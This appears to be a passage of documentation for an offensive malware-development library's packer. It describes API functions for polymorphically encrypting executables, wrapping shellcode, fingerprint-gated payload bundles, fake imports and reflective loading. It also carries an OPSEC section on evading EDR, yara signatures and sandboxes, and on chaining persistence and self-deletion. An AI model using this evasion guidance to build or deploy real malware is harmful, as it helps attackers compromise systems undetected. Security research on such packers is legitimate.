Modifies a PE32+ or ELF64 in place: encrypts `.text` with the SGN
polymorphic encoder, appends a small decoder stub as a new section,
rewrites the entry point. Output is a runnable binary.

| Field | Type | Default | Notes |
|---|---|---|---|
| `Format` | `Format` | (required) | `FormatWindowsExe` / `FormatLinuxELF` |
| `Stage1Rounds` | `int` | 3 | SGN decoder rounds; 1..10 |
| `Seed` | `int64` | 0 (= random) | Same seed + input + rounds = byte-identical output |
| `Compress` | `bool` | false | LZ4 `.text` before SGN |
| `AntiDebug` | `bool` | false | Windows-only: PEB + RDTSC probe |
| `CipherKey` | `[]byte` | nil | Reserved for future AES wrapping |

**Sentinels** (use `errors.Is`):

- `transform.ErrUnsupportedInputFormat` — magic doesn't match `Format`.
- `transform.ErrNoTextSection` — input lacks executable section.
- `transform.ErrOEPOutsideText` — OEP not in `.text`.
- `transform.ErrTLSCallbacks` — input has TLS callbacks (would run
  before stub).
- `transform.ErrStubTooLarge` — stub exceeded `StubMaxSize`.

#### `func PackShellcode(shellcode []byte, opts PackShellcodeOptions) ([]byte, []byte, error)`

Wraps raw position-independent shellcode in a runnable host PE / ELF;
optionally chains through `PackBinary` for the SGN-style stub envelope.
Returns `(binary, key, err)` — `key` is non-nil only when `Encrypt=true`
and the operator did not supply one.

| Field | Type | Default | Notes |
|---|---|---|---|
| `Format` | `Format` | (required) | `FormatWindowsExe` / `FormatLinuxELF` — `FormatUnknown` rejected |
| `Encrypt` | `bool` | false | Run the wrapped host through PackBinary's stub envelope |
| `ImageBase` | `uint64` | 0 (= canonical) | Per-build PE ImageBase / ELF vaddr override; 0 → 0x140000000 (PE) or 0x400000 (ELF) |
| `Stage1Rounds` | `int` | 3 | SGN decoder rounds; `-encrypt` only |
| `Seed` | `int64` | 0 (= random) | Same seed → byte-identical output; `-encrypt` only |
| `Key` | `[]byte` | nil | Operator-supplied AEAD key; `-encrypt` only |
| `AntiDebug` | `bool` | false | Windows-only PEB + RDTSC probe; `-encrypt` only |
| `Compress` | `bool` | false | LZ4 the wrapped host before SGN; `-encrypt` only |

**Sentinels** (use `errors.Is`):

- `packer.ErrShellcodeEmpty` — shellcode bytes nil or zero-length.
- `packer.ErrUnsupportedFormat` — `opts.Format` is `FormatUnknown`.
- `transform.ErrMinimalELFWithSectionsCodeEmpty` — surfaced as a wrap error.

#### `func Pack(data []byte, opts Options) ([]byte, []byte, error)`

Encrypt arbitrary bytes into an `MLDV…` blob. Returns `(blob, key, err)`.

#### `func Unpack(packed []byte, key []byte) ([]byte, error)`

Reverse `Pack`. Sentinels: `ErrShortBlob`, `ErrBadMagic`,
`ErrUnsupportedVersion`, `ErrUnsupportedCipher`,
`ErrUnsupportedCompressor`, `ErrPayloadSizeMismatch`. Wrong key surfaces
as the underlying AEAD authentication error.

#### `func PackPipeline(data []byte, pipeline []Step) ([]byte, []Step, error)`

Multi-stage `Pack` — compose ciphers, compressors, permutations.
Returns the blob plus the per-step keys (caller must store all of
them to invert via `UnpackPipeline`).

### Multi-target bundle

#### `func PackBinaryBundle(payloads []BundlePayload, opts BundleOptions) ([]byte, error)`

Serialise N payloads into a single bundle blob. Each payload is XOR-encrypted
with a fresh random 16-byte rolling key. Wire format: 32 B `BundleHeader` +
N × 48 B `FingerprintEntry` + N × 32 B `PayloadEntry` + concatenated
encrypted data.

| `BundleOptions` field | Notes |
|---|---|
| `FallbackBehaviour` | `BundleFallbackExit` / `…First` / `…Crash` |
| `FixedKey` | Test determinism only — defeats per-payload secrecy |
| `Profile` | Per-build IOC overrides; see `DeriveBundleProfile` |

Sentinels: `ErrEmptyBundle`, `ErrBundleTooLarge` (>255 payloads).

#### `func DeriveBundleProfile(secret []byte) BundleProfile`

SHA-256 derives `BundleProfile{Magic, Version, FooterMagic, Vaddr}`
from a per-deployment secret. Empty secret returns the canonical
wire-format defaults.

#### `func InspectBundle(bundle []byte) (BundleInfo, error)`
#### `func InspectBundleWith(bundle []byte, profile BundleProfile) (BundleInfo, error)`

Parse a bundle blob into typed `BundleInfo` + `BundleEntryInfo` slice.
The `*With` variant validates against the operator's per-build
`profile.Magic` instead of the canonical `BundleMagic`.

Sentinels: `ErrBundleTruncated`, `ErrBundleBadMagic`,
`ErrBundleOutOfRange`.

#### `func SelectPayload(bundle []byte, hostVendor [12]byte, hostBuild uint32) (int, error)`
#### `func SelectPayloadWith(bundle []byte, profile BundleProfile, hostVendor [12]byte, hostBuild uint32) (int, error)`

Pure-Go reference implementation of the runtime predicate match. Returns
the matched payload index, or -1 on no match.

#### `func UnpackBundle(bundle []byte, idx int) ([]byte, error)`
#### `func UnpackBundleWith(bundle []byte, idx int, profile BundleProfile) ([]byte, error)`

Build-host helper: decrypt one payload by index. The runtime stub
re-implements the same logic in asm and never exposes keys to memory
unless its predicate matched.

#### `func MatchBundleHost(bundle []byte) (int, error)`
#### `func MatchBundleHostWith(bundle []byte, profile BundleProfile) (int, error)`

`SelectPayload` + reads host vendor/build automatically (`HostCPUIDVendor`
+ `RtlGetVersion` on Windows / 0 on Linux).

#### `func AppendBundle(launcher, bundle []byte) []byte`
#### `func AppendBundleWith(launcher, bundle []byte, profile BundleProfile) []byte`
#### `func ExtractBundle(wrapped []byte) ([]byte, error)`
#### `func ExtractBundleWith(wrapped []byte, profile BundleProfile) ([]byte, error)`

Concatenate / extract a bundle to/from a pre-built launcher binary.
Layout: `[ launcher | bundle | bundleStartOffset:8 LE | FooterMagic:8 ]`.

#### `func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error)`
#### `func WrapBundleAsExecutableLinuxWith(bundle []byte, profile BundleProfile) ([]byte, error)`
#### `func WrapBundleAsExecutableLinuxWithSeed(bundle []byte, profile BundleProfile, seed int64) ([]byte, error)`

All-asm wrap path. The hand-rolled stub (~160 B) + minimal-ELF
container (~120 B) + bundle bytes = a runnable Linux ELF in
~470 B. The `*WithSeed` variant exposes deterministic stub
polymorphism for reproducible builds; the standard variant draws a
fresh `crypto/rand` seed.

### Cover layer

The cover layer adds plausible-looking structural noise to packed
binaries to frustrate naive packer fingerprints. Orthogonal to the
bundle path — applies to any PE/ELF.

#### `func AddCoverPE(input []byte, opts CoverOptions) ([]byte, error)`
#### `func AddCoverELF(input []byte, opts CoverOptions) ([]byte, error)`

Append junk sections (PE) / PT_LOADs (ELF) filled per `CoverOptions.Fill`
(`JunkRandom` / `JunkZero` / `JunkPattern`). All sections are
`MEM_READ`-only on PE and `PF_R`-only on ELF — the cover never adds
executable surface.

#### `func DefaultCoverOptions(seed int64) CoverOptions`
#### `func ApplyDefaultCover(input []byte, seed int64) ([]byte, error)`

Convenience: a sensible default `CoverOptions` (5-7 sections,
`JunkPattern` fill, frequency-ordered byte alphabet) plus the
all-in-one wrapper that auto-detects PE vs ELF.

#### `func AddFakeImportsPE(input []byte, fakes []FakeImport) ([]byte, error)`
#### `var DefaultFakeImports []FakeImport`

Append benign-DLL `IMAGE_IMPORT_DESCRIPTOR` entries (kernel32, user32,
shell32, ole32) so the packed PE's IAT looks normal. The kernel
resolves these at load time; the binary's actual code never references
them. Companion to `AddCoverPE`.

### Runtime — `pe/packer/runtime`

#### `func Prepare(input []byte) (*PreparedImage, error)`
#### `func (p *PreparedImage) Run() error`
#### `func (p *PreparedImage) Free() error`

Reflective in-process loader. Parses the input PE/ELF, mmaps PT_LOADs
(or PE sections), applies relocations, mprotects per-segment, patches
auxv, and jumps to entry on a fake kernel stack. Used by
`cmd/bundle-launcher`'s `MALDEV_REFLECTIVE=1` path.

`Run()` requires `MALDEV_PACKER_RUN_E2E=1` in the environment — explicit
operator opt-in so the runtime can't fire by accident in processes
that happen to import the package.

---

## OPSEC & Detection

### What defenders see

| Artefact | Where defenders look | Mitigation |
|---|---|---|
| `MLDV` magic at file offset 0 (raw blob) | Static signature scanner | `Pack` is a byte stream, not an exe — wrap in a host PE before shipping |
| Appended `.mldv` section in `PackBinary` output | PE section-name scan | Rename via `pe/morph` upstream |
| Single-PT_LOAD-RWX ELF (all-asm wrap) | yara structural rule | Irreducible without changing the container |
| Bundle wire format (magic + 32 B header + 48 B entries) | Static rule keyed on the structure | `-secret` randomises the magic + version + footer + ELF vaddr; structural offsets remain |
| Stub byte signatures across packs | yara rule on opcode sequence | Per-pack NOP polymorphism (Intel multi-byte NOPs spliced at slot A) breaks naive byte signatures |
| `.text` RWX in `PackBinary` output | Memory-permissions audit | The stub mprotects on entry so `.text` is RWX for a few cycles only — but it IS RWX for that window |
| Imports / exports / TLS / resources of the input | They survive packing | Use `pe/morph` / `pe/imports` upstream |

### Process-tree visibility

| Mode | Process tree |
|---|---|
| `PackBinary` packed exe | One process — kernel does the load |
| `cmd/bundle-launcher` default | Two processes (launcher → execve payload) |
| `cmd/bundle-launcher` reflective (`MALDEV_REFLECTIVE=1`) | One process |
| All-asm wrap | One process |

### D3FEND counters

- [D3-FCA](https://d3fend.mitre.org/technique/d3f:FileContentAnalysis/)
  — magic-byte fingerprinting catches canonical builds; per-build
  randomisation defeats it.
- [D3-PA](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis/)
  — RWX `.text` and high-entropy regions look anomalous to memory
  scanners.

### Operator hardening

- Pair every `PackBinary` with `pe/morph.UPXMorph` + `pe/strip` to
  remove pclntab strings / Go BuildID that survive `.text` encryption.
- Run `cmd/packer-vis compare` before+after pack to confirm the
  expected entropy gain (typical `+2.0..+3.0` bits/byte on a Go
  static-PIE).
- For multi-target deployments, pick a fresh `-secret` per ship cycle.
  Reusing secrets defeats the per-build property.
- The reflective launcher path leaves no on-disk plaintext for the
  matched payload — prefer it over `memfd+execve` on hosts with
  aggressive auditd / EDR file-write monitoring.
- `cmd/packerscope` against your own build is a sanity check —
  if the tool can identify your binary's wire format, the operator
  can too.

---

## Composability with other maldev packages

The packer is intentionally narrow — it produces a runnable binary.
Wider operator workflows chain other maldev packages around it.

| Hook point | Package | What you get |
|---|---|---|
| Pre-pack section / IAT scramble | `pe/morph`, `pe/strip` | Section rename, Go pclntab strip — hides strings the SGN encoder otherwise leaks |
| Pre-pack masquerade | `pe/masquerade`, `pe/donors`, `pe/cert` | Authenticode forge, icon graft, version-info swap — packed binary inherits the legitimate-looking shell |
| Stronger payload encryption | `crypto/aesgcm`, `crypto/chacha20` | The bundle's per-payload cipher is XOR-rolling today; pre-encrypt the payload before bundling for a real AEAD layer |
| Sandbox bail before reveal | `recon/antivm.Hypervisor`, `recon/sandbox` | Wrap the launcher so it exits cleanly on a known sandbox before any payload byte gets touched |
| In-process injection | `inject/*` | The bundle's payload can BE the shellcode an operator injects elsewhere; pack→bundle→inject = three orthogonal layers |
| Custom predicates | `hash/apihash`, `recon/antivm.CPUVendor` | Extend `FingerprintPredicate` with operator host-fingerprint logic |
| Persistence after dispatch | `persistence/*` | Dispatched payload installs itself via Run/RunOnce / scheduled task / service |
| Cleanup after dispatch | `cleanup/selfdelete`, `cleanup/timestomp` | Self-delete after payload finishes — typical operator pattern |

The `cmd/bundle-launcher` Go-runtime path is where these compose
naturally — it's pure Go, and any maldev import works at the call
site of `executePayload`. The all-asm path is intentionally minimal
(no Go runtime, ~470 B); operators wanting a recon prologue there
need a corresponding asm primitive (`pe/packer/stubgen/stage1` already
houses CPUID/PEB; sandbox / hypervisor primitives can be added the
same way).

---

## Asm tooling — golang-asm vs alternatives

The packer uses `pe/packer/stubgen/amd64.Builder`, a thin wrapper
around [`golang-asm`](https://github.com/twitchyliquid64/golang-asm)
(the encoder Go's compiler uses for plan9 asm). `Builder` exposes a
small hand-curated subset (MOV / LEA / XOR / SUB / ADD / MOVZX / MOVB
/ DEC / POP / JMP / JNZ / JE / CALL / RET / NOP / RawBytes / labels);
the remaining x86-64 encodings (CMP / TEST / SHL / IMUL / SETZ /
multi-byte NOPs) ride on `RawBytes` with hand-encoded ModRM.

**Why not [`mmcloughlin/avo`](https://github.com/mmcloughlin/avo)?**
Avo generates `.s` files at build time that Go assembles into the
calling binary. Excellent for multi-arch math kernels (chacha20,
blake2b). Wrong direction for our use case: we EMIT raw bytes at
PACK time into a dynamically sized stub embedded in someone else's
binary. golang-asm gives us the JIT-style "encode bytes into a
buffer" API we need; avo gives us a `.o` linked into the packer
itself.

**Where the hand-encoded bytes hurt.** The stub's scan loop, vendor
compare, decrypt loop are 100-200 byte sequences with rel8
displacements computed by hand and cross-checked via
offset-trace comments. Eight wrong displacements were caught while
shipping the vendor-aware dispatch. A targeted refactor extending
`amd64.Builder` with CMP / TEST / Jcc-suite / SHL would let the stub
become a chain of `b.CMP(...) ; b.JGE(.label)` calls with golang-asm
computing displacements at link time. ~200-LOC extension. Not
blocking; tracked.

---

## Tested-fixture matrix (2026-05-12)

The empirical results below come from running each fixture
through ALL applicable pack modes + Win10 VM E2E. All fixtures
live under `pe/packer/testdata/` (force-tracked binaries;
rebuild via the `pe/packer/testdata/Makefile` targets).

### Vanilla / RandomizeAll matrix (Mode 3 EXE pack)

| Fixture | Class | Vanilla pack | `RandomizeAll` pack | Comment |
|---|---|---|---|---|
| `winhello.exe` | Go static-PIE, exits cleanly | ✅ runs + prints stdout | ✅ runs + prints stdout | the canonical happy path |
| `winpanic.exe` | Go static-PIE, nil-deref + `defer/recover` | ✅ recovers + prints stack | ✅ recovers + prints stack | `.pdata` stale doesn't bite Go (Go uses pclntab unwinder, not Win32 SEH) |
| `winhello_w32.exe` | mingw `-nostdlib`, Win32 directly (no CRT, no globals, no constructors) | ✅ runs + prints stdout | ✅ runs + prints stdout | proves the IMPORT walker covers non-Go MSVC-style binaries too — directory inventory IMPORT + EXCEPTION + IAT only |
| `winhello_w32_res.exe` | `winhello_w32` + RT_GROUP_ICON + RT_MANIFEST embedded via `tc-hib/winres` (pure Go, no mingw windres) | ✅ resources parseable post-pack | ✅ resources parseable post-pack | proves the **RESOURCE walker** (Phase 2-F-3-c-3, v0.125.0) preserves icons/manifests under `RandomizeImageVAShift`. Regenerate fixture: `scripts/build-fixture-winres.sh`. |
| `winver.exe` (Windows 11 stock) | MSVC PE, **CFG-protected** | ❌ crash `0xC0000409` STATUS_STACK_BUFFER_OVERRUN | ❌ load reject "is not a valid Win32 application" | **CFG cookie protection rejects modified .text** — see Known limitations below |
| **mingw default (with CRT)** | C compiled normally, `puts` etc. | ❌ rejected at `PackBinary` time | ❌ same | mingw CRT injects TLS callbacks → `transform.ErrTLSCallbacks`. Workaround: build with `-nostdlib` like `winhello_w32` |
| **DLLs as EXE input** (`testlib.dll`) | mingw no-CRT shared library passed to `Format=FormatWindowsExe` | ❌ rejected at `PackBinary` time | ❌ same | `transform.ErrIsDLL` — input doesn't match `Format=WindowsExe`. **Workaround:** use `Format=FormatWindowsDLL` (Mode 7, ✅ since v0.128.0) or wrap with `PackBinaryBundle`. |

### DLL-mode validations (Modes 7-10)

| Test | Mode | Win10 VM E2E | Validates |
|---|---|---|---|
| `TestPackBinary_FormatWindowsDLL_LoadLibrary_E2E` | 7 (`FormatWindowsDLL`) | ✅ since v0.128.0 | Native DllMain stub LoadLibrary'd cleanly. Uses `testutil.BuildDLLWithReloc` synthetic fixture. |
| `TestPackBinary_ConvertEXEtoDLL_LoadLibrary_E2E` | 8 (`ConvertEXEtoDLL`) | ✅ | Converted EXE-as-DLL: payload writes marker file from spawned thread. Uses `probe_converted.exe`. |
| `TestPackBinary_ConvertEXEtoDLL_LoadLibrary_Compress_E2E` | 8 + `Compress` | ✅ since v0.124.0 | Same + LZ4 inflate path. Confirms slice 5.7. |
| `TestPackBinary_ConvertEXEtoDLL_LoadLibrary_AntiDebug_E2E` | 8 + `AntiDebug` | ✅ since v0.122.0 | Silent-exit when KVM trips RDTSC↔CPUID delta on virtualised host. |
| `TestPackProxyDLL_LoadLibrary_E2E` | 10 (`PackProxyDLL`) | ✅ since v0.129.0 | Fused proxy loads — basic structural validation. |
| `TestPackProxyDLL_Strict_E2E` | 10 strict | ✅ since `c9c0635` | Both side effects: (a) `GetProcAddress` resolves forwarder to real `version.dll` at 0x7ff9aff810b0 via GLOBALROOT scheme, (b) packed payload writes marker from thread inside host. Slice 6.3 closure. |

**Operational envelope:** `PackBinary` is validated for
**Go-built static-PIE Windows binaries**. Microsoft CFG-protected
binaries are out of scope (see below). Non-CFG MSVC binaries
and DLLs haven't been tested against the current walker
coverage; a failure code other than `0xC0000409` would point
at a missing walker per the
[walker-suite plan](../../refactor-2026-doc/packer-2f3c-walker-suite-plan.md).

## Known limitations

> **Diagnosing failures.** The companion doc
> [`docs/refactor-2026-doc/packer-debug-toolkit.md`](../../refactor-2026-doc/packer-debug-toolkit.md)
> covers the empirical-bisection workflow + in-tree CLIs
> (`packer-vis sections`, `packer-vis directories`,
> `packer-vis entropy`, `packer-vis compare`) that solve most
> packer crashes without an external debugger. It includes a
> recognisable-failure-code table mapping `0xC0000005` /
> `0xC0000135` / `0xC0000409` / "is not a valid Win32
> application" to their root causes + first-action remediation.

### `0xC0000409` (STATUS_STACK_BUFFER_OVERRUN) on Windows execution

**Symptom:** packed binary exits with exit code `3221226505`
(`0xC0000409`) on Windows immediately after spawn, before any
of your code runs.

**Cause:** the input PE was compiled with Control Flow Guard
(`/guard:cf` MSVC, default for many modern Microsoft binaries).
CFG bakes a runtime check that validates `.text` integrity via
the `__guard_check_icall_fptr` cookie + the
`GuardCFFunctionTable` whitelist. PackBinary's SGN encryption
of `.text` invalidates that signature; the runtime check
catches it on the first indirect call and aborts.

**Workaround:** wrap the binary instead of in-place encrypting
it — use `PackBinaryBundle` + the `cmd/bundle-launcher` runtime,
which preserves the original binary intact and reflectively
loads it at runtime. The CFG cookie sees the unmodified `.text`
and stays happy.

**Why no walker fixes this:** CFG isn't an RVA-staleness
problem. It's a cryptographic-style integrity check on the
code section's BYTES. Any in-place mutation of `.text` (which
is what `PackBinary` does by definition) trips it. The fix
isn't a directory walker, it's a different pack mode.

## Limitations

A complete planned-improvements list with implementation breakdown
lives at
[docs/superpowers/plans/2026-05-09-windows-tiny-exe.md](../../superpowers/plans/2026-05-09-windows-tiny-exe.md)
— it tracks every gap below as an actionable engineering ticket.
Brief summary follows.

- **Single PT_LOAD RWX in the all-asm path.** The stub mutates its
  own page (the bundle data). The trade-off is documented; operators
  needing R+X / R+W split should use Mode 3 (`PackBinary`) which
  preserves segment-level permissions.
- **PT_WIN_BUILD predicates are no-ops on Linux all-asm.** The
  predicate reads `PEB.OSBuildNumber`, which only exists on Windows.
  Linux V2-Negate stub (`bundleStubVendorAwareV2Negate`) skips the
  build-number compare; matching against `BuildMin > 0` will silently
  fall through. Windows V2NW (`bundleStubV2NegateWinBuildWindows`)
  honours it fully. Use `PT_CPUID_VENDOR` / `PT_CPUID_FEATURES` /
  `PT_MATCH_ALL` for cross-platform predicates.
- **TLS callbacks rejected by `PackBinary`.** The stub runs at the
  rewritten entry point — TLS callbacks would fire BEFORE the stub
  could decrypt. Surfaced as `transform.ErrTLSCallbacks`.
- **OEP must lie inside `.text`.** The stub's final JMP targets the
  decrypted region; binaries with custom-linker entry points outside
  `.text` return `transform.ErrOEPOutsideText`.
- **`cmd/bundle-launcher` reflective load expects static-PIE ELF.**
  The reflective loader (`pe/packer/runtime`) understands
  static-PIE-shaped input — not raw shellcode and not dynamically-linked
  ELFs. Use the all-asm path for shellcode payloads or keep payloads
  packaged via `PackBinary` upstream.
- **Bundle predicates are AND-combined within an entry, OR across
  entries.** No grouping operator. Express OR-of-AND by adding
  multiple FingerprintEntry rows pointing at the same payload.

---

## Glossary

Plain-language explanations of the jargon used throughout this doc.
Listed in the order an operator typically encounters each term.

**Payload.** The thing you actually want to run on the target — a real
PE/ELF binary, a packed binary, raw shellcode, anything. The packer
wraps a payload to make it harder to detect / fingerprint.

**SGN (Shikata Ga Nai-style polymorphic encoder).** A self-decoding
byte stream where each byte is XORed with a key, and the key itself
rotates every round. "Polymorphic" means the *bytes of the decoder*
are randomised per pack: the same input encoded twice produces two
decoders that LOOK different but DO the same thing. Defeats yara
rules keyed on a fixed decoder pattern.

**Round.** One pass over the encoded payload, applying one
substitution and one register choice. More rounds = harder to
recognise but bigger stub. Ships 1..10; default 3.

**PIC trampoline (`call .pic ; pop r15`).** Trick used by
position-independent code to learn its own runtime address.
The `call` instruction pushes the address of the instruction
*after* it; the `pop` retrieves that address into a register.
Now the code can compute "I'm running here, my data is at +N
from here" without knowing where the kernel loaded it.

**RWX.** Read + Write + Execute permissions on a memory page.
Legitimate code is almost always Read+Execute (code) or Read+Write
(data). RWX means the page can be modified AND run, which is what
self-decrypting stubs need (decrypt the bytes, then run them).
Loud signal for any EDR — they specifically watch for RWX
allocations.

**PE32+ / `.exe`.** Windows executable format. PE32+ is the 64-bit
flavour. The kernel's loader reads this format directly when you
run a `.exe`.

**ELF / `.elf`.** Linux executable format. The kernel reads this when
you run a `chmod +x` binary.

**Static-PIE.** Position-Independent Executable that's also
statically linked — no dependency on the dynamic linker (`ld.so`).
Required for the reflective loader because we can't load the
dynamic linker ourselves; the binary has to stand alone.

**PT_LOAD.** ELF program header type meaning "loadable segment".
The kernel `mmap`s these segments into memory at process start.
A minimal ELF has one PT_LOAD covering everything.

**Brian Raiter shape.** Reference to Raiter's 2002 article showing
the smallest legal Linux ELF (45 bytes). Our minimal-ELF emitter
follows that layout, slightly extended to host real code.

**`rep movsb`.** x86 instruction that copies bytes from `[rsi]` to
`[rdi]` exactly `rcx` times. The C `memmove` is one instruction in
asm.

**auxv (auxiliary vector).** Kernel-supplied data pushed onto the
stack at process start: random canary, page size, AT_RANDOM, etc.
The reflective loader rewrites it so the loaded payload sees its
OWN values, not the launcher's.

**OEP (Original Entry Point).** The address the binary's normal
entry point was at *before* the packer rewrote it. The stub jumps
to OEP after decrypting `.text`.

**TLS callbacks.** Code that runs *before* the binary's entry point
— per-thread initialisation. Packers reject inputs with TLS
callbacks because they'd run before the stub got a chance to
decrypt.

**Imports / IAT.** External functions a PE/ELF needs from system
DLLs (`kernel32.dll!CreateFile`, etc.). The Import Address Table
holds the resolved addresses. The kernel fills these in when
loading the binary.

**CPUID.** x86 instruction that returns CPU information. Leaf 0
returns the vendor string ("GenuineIntel" / "AuthenticAMD").
Universal — every x86 CPU since the original Pentium implements it.

**PEB (Process Environment Block).** Windows kernel-managed structure
at a known offset (`gs:[0x60]` on x64) carrying process state — the
loaded module list, command line, OS version, etc. Reading it
doesn't require any API call.

**yara.** File-pattern matching language used by AV / EDR for static
signatures. "yara'able" means a defender can write a yara rule that
matches the artefact.

**Kerckhoffs's principle.** Auguste Kerckhoffs (1883): the security
of a cipher must depend on the secrecy of the key, not the secrecy
of the algorithm. Applied here: the bundle wire format is public;
the per-build secret is the only thing varying between operators.

**AEAD (Authenticated Encryption with Associated Data).** Encryption
scheme that both encrypts the plaintext AND verifies the ciphertext
hasn't been tampered with. AES-GCM is the canonical example —
decryption fails (rather than producing garbage) if anyone modified
a single byte.

**memfd_create.** Linux syscall that creates an anonymous file
descriptor backed by RAM (no on-disk inode). The bundle launcher
uses it to write the decrypted payload into RAM and `execve` it
straight from there — zero on-disk plaintext for the matched
payload.

**Reflective loading.** Loading a PE/ELF *into the current process's
address space* and jumping to its entry — instead of asking the
kernel to load it via `execve` / `CreateProcess`. Used to avoid
showing a child process in the process tree.

**rel8 displacement.** x86 short conditional jumps (`Jcc`) take a
1-byte signed offset (-128 to +127) from the end of the jump
instruction. Hand-encoding asm with rel8 displacements is where
mistakes happen — every shift in the byte stream needs all rel8
distances recomputed.

**ROR-13 hash.** Rotate-Right-13 hash — common API-resolution trick
in shellcode. Replaces literal API names like "ExitProcess" with a
4-byte hash so the strings don't appear in the binary. Defeated by
defenders who hash the API name themselves and compare.

**ASLR (Address Space Layout Randomisation).** OS feature that
randomises the address every binary lands at. Position-independent
code (PIC) tolerates ASLR; non-PIC code crashes when its absolute
addresses don't match the load address.

## See also

- [`pe/packer/runtime`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/packer/runtime) — reflective in-process loader
- [`pe/packer/stubgen`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/packer/stubgen) — SGN polymorphic encoder + per-stage asm primitives
- [`pe/packer/transform`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/packer/transform) — section-aware PE/ELF emit + minimal-ELF writer
- [`cmd/packer`](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/packer) — pack / unpack / bundle / wrap CLI
- [`cmd/bundle-launcher`](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/bundle-launcher) — Go-runtime bundle launcher
- [`cmd/packerscope`](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/packerscope) — defender-side artefact analyser
- [`cmd/packer-vis`](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/packer-vis) — entropy + bundle visualiser
- Worked example: [docs/examples/packer-elevation-tour.md](../../examples/packer-elevation-tour.md)
- Worked example: [docs/examples/multi-target-bundle.md](../../examples/multi-target-bundle.md)
- Operator playground: `make packer-demo`
- Wire format spec: [docs/superpowers/specs/2026-05-08-packer-multi-target-bundle.md](../../superpowers/specs/2026-05-08-packer-multi-target-bundle.md)
